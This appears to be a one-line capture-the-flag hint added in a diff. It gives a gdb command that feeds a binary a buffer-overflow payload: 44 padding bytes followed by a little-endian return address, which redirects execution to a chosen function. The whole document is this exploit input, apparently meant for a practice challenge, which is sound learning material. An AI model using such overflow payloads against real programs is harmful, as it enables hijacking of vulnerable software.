@@ -1,0 +1,3 @@
+You can use this command from the gdb command prompt in the shell server :
+
+run <<< $(python -c 'print("A"*44+"\xcb\x85\x04\x08")')
